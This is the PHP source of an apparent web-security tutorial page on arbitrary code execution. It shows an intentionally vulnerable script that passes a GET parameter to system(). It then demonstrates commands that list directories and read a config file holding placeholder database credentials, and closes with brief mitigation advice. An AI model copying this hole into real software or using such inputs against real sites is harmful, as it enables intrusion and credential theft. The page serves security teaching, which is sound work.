<?php
	require('includes/functions.php');
	echo getHeader('Arbitrary Code Execution');
?>

    <!-- Main jumbotron for a primary marketing message or call to action -->
    <div class="jumbotron">
        <div class="container">
            <h1>Arbitrary Code Execution</h1>
			<a class="btn btn-primary btn-lg" href="/">
				<span class="glyphicon glyphicon-chevron-left"></span>
				Back To Home
			</a>
        </div>
    </div>

    <div class="container">
        <!-- Example row of columns -->
        <div class="row">
            <div class="col-md-12">
				
				<h2>Executing system commands using unsafe PHP scripts</h2>
				<span>This tutorial will be used to determine the MySQL connection details of a vulnerable website</span>
				<br><br><br>
				<span>See the example page: <a href="/arbitrary-code-execution/example" target="_blank">Example</a></span>
				<br><br>
				<h4>PHP</h4>
				<pre>
					<code class="php">
&lt;?php

    if (isset($_GET['command'])) {
        system($_GET['command']);
    } else {
        echo 'Please enter a GET page value, or click here for a example: <a href="/arbitrary-code-execution/example?command=dir">Click me! :)</a>';  
    }

?&gt;
					</code>
				</pre>
				
				<h4>Output</h4>
				<pre>
					<code class="php">
Volume in drive X is External Volume Serial Number is 4608-825D Directory of X:\xampp\htdocs\web-security-fundamentals 2015-02-19 11:52 AM
. 2015-02-19 11:52 AM
.. 2015-02-19 11:53 AM 4,852 .htaccess 2015-02-19 12:00 PM 3,660 ace.php 2015-02-19 11:59 AM 258 ace_example.php 2015-02-06 09:25 PM
content 2015-02-10 02:46 PM 3,680 fpd.php 2015-02-10 02:02 PM 289 fpd_example.php 2015-02-10 02:02 PM
includes 2015-02-17 01:56 PM 8,342 index.php 2015-01-22 08:49 AM 1,108 LICENSE 2015-01-22 08:49 AM 111 README.md 2015-02-10 02:28 PM 5,705 sqlinjection.php 2015-02-06 08:41 PM 3,313 sqlinjection_example.php 2015-01-21 02:16 PM
style 2015-01-25 05:20 PM 5,515 xss.php 2015-01-25 03:58 PM 2,103 xss_example.php 12 File(s) 38,936 bytes 5 Dir(s) 735,169,593,344 bytes free
					</code>
				</pre>
				
                We have successfully executed a command on the system that is hosting this website. Now, let's fool around. What's in the includes folder I wonder? Let's change the GET variable to <strong>dir%20includes</strong>
                
				<h4>Browsing the file structure</h4>
				<pre>
					<code class="php">
Volume in drive X is External Volume Serial Number is 4608-825D Directory of X:\xampp\htdocs\web-security-fundamentals\includes 2015-02-10 02:02 PM
. 2015-02-10 02:02 PM
.. 2015-01-21 03:00 PM 143 cfg.filesystem.php 2015-02-19 11:52 AM 202 config.php 2015-01-24 11:12 PM 915 functions.php 3 File(s) 1,260 bytes 2 Dir(s) 735,169,593,344 bytes free
					</code>
				</pre>
                
                <strong>config.php</strong> is really interesting looking... I bet it has database passwords. change the GET variable to <strong>type%20includes\config.php</strong>
                
                You recieved a blank page.. what if you view the page source?
				<h4>Super secret secure information :D</h4>
				<pre>
					<code class="php">
&lt;?php

/**
 * Example dummy config file which is used for the Full Path Disclosure vulnerability example
 *
 */

$database = 'DATABASENAME';
$username = 'USERNAME';
$password = 'PASSWORD';
$server   = 'SERVER';

?&gt;
					</code>
				</pre>
                
                Again, we have successfully gathered all database connection credentials for this web application...bad things can be done with this information. But because this is running system commands, we could traverse the entirety of the webhosts system if it is misconfigured.
				
				<h3>Solution</h3>
				
				To protect your web applications from vulnerabilities like these, do not use use system commands anywhere in your code (such as system(), exec(), passthru(), shell_exec(), etc.)
				
			</div>
		</div>

<?php
	echo getFooter();
?>